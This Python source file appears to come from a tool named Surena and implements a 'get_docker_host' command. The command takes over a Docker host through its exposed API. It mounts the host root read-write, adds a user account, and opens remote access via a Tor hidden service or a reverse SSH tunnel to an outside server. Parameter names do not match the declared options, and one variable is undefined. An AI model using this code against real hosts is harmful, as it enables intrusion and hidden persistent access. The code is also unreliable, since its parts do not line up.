import logging
import time
from os.path import join

import click
from docker import ContainerCollection
from docker.client import ContainerCollection, ImageCollection
from docker.errors import APIError
from pkg_resources import resource_filename

from surena.cli.commons import Ip, Port, required_if_option_has_specific_value
from surena.models.commons import countdown
from surena.models.docker import DockerClient, SpyContainer
from surena.models.ssh import SSHServer

logging.basicConfig(level=logging.INFO)


SECONDS_OF_LIVE = 300


logger = logging.getLogger()


@click.command("get_docker_host")
@click.option(
    "--docker-host-address",
    required=True,
    show_default=True,
    help="The Docker host address.",
)
@click.option(
    "--docker-host-port",
    required=True,
    type=Port(),
    show_default=True,
    help="The Docker host port.",
)
@click.option(
    "--access-method",
    required=True,
    type=click.Choice(["tor", "reverse-ssh"]),
    show_default=True,
    help="Select the method for accessing to Docker host machine.",
)
@click.option(
    "--ssh-server-address",
    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
    show_default=True,
    help=(
        "When selecting reverse SSH as the access method, you should specify a server"
        " with SSH service for establishing the reverse SSH connection."
    ),
)
@click.option(
    "--ssh-server-username",
    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
    show_default=True,
    help="The username of remote SSH server.",
)
@click.option(
    "--ssh-server-password",
    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
    show_default=True,
    help="The password of remote SSH server.",
)
@click.option(
    "--ssh-server-port",
    type=Port(),
    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
    default=22,
    show_default=True,
    help="The SSH port of remote SSH server.",
)
def get_docker_host(
    target_address: str,
    target_port: int,
    connection_method: str,
    ssh_server_name: str,
    ssh_server_username: str,
    ssh_server_password: str,
    ssh_server_ssh_port: int,
) -> None:
    """
    The "get-docker-host" command can show you if your Docker host has
    vulnerabilities due to misconfiguration.
    """
    docker_client = DockerClient(target_address, target_port)

    if docker_client.get_operation_system_type().lower() != "linux":
        raise ValueError("Support only linux as docker host operation system.")

    dockerfile_path = resource_filename(
        "surena.models.docker",
        "{}.Dockerfile".format(embedded_image_type),
    )
    embedded_image_name = docker_client.create_uniq_image_name()

    embedded_image = docker_client.build_image(dockerfile_path, embedded_image_name)

    container = docker_client.run_container(
        embedded_image,
        command="/bin/sh",
        detach=True,
        remove=True,
        volumes={"/": {"bind": "/data", "mode": "rw"}},
        network="host",
        tty=True,
    )

    spy_container = SpyContainer(container)
    username = spy_container.generate_uniq_username()
    password = SpyContainer.generate_random_word()
    spy_container.add_username_to_host(username, password)

    docker_host_free_port = spy_container.get_free_port_on_host()
    spy_container.add_port_to_service_ssh()

    if connection_method == "tor":
        tor_port = spy_container.get_free_port_on_host()
        spy_container.config_service_tor(docker_host_free_port, tor_port)
        spy_container.start_service_tor()
        spy_container.wait_until_conect_to_tor_network(docker_host_free_port, tor_port)
        tor_hostname = spy_container.get_tor_hostname().strip()
        logger.info(
            'Run command "torsocks ssh {}@{} -p {}" to connect to target host with'
            " password {}".format(
                username, tor_hostname, docker_host_free_port, password
            )
        )
    else:
        ssh_client = SSHServer(
            ssh_server_name,
            ssh_server_ssh_port,
            ssh_server_username,
            ssh_server_password,
        )
        ssh_client.config_ssh_server()
        free_port_on_server = ssh_client.get_free_port()

        spy_container.reverse_ssh_from_docker_host_to_remote_server(
            ssh_server_name,
            ssh_server_ssh_port,
            ssh_server_username,
            ssh_server_password,
            free_port_on_server,
        )
        logger.info(
            'You can connect to docker host with ssh service "ssh -o '
            "'StrictHostKeyChecking no' {}@{} -p {}\" with password "
            "{} ".format(username, ssh_server_name, free_port_on_server, password)
        )

    try:
        countdown(SECONDS_OF_LIVE)
    finally:
        spy_container.delete_username_from_host(username)
        if docker_client.remove_container(spy_container):
            logger.info('Surena removed Image "spy container" from Docker Host.')
        else:
            logger.error("Surena could not remove container from Docker Host.")

        if docker_client.remove_image(docker_client, embedded_image):
            logger.info(
                'Surena removed Image "{}" from Docker Host.'.format(
                    embedded_image_name
                )
            )
        else:
            logger.error(
                'Surena could not remove Image "{}" from Docker Host.'.format(
                    embedded_image_name
                )
            )
        docker_client.destroy_containers()
        docker_client.destroy_images()
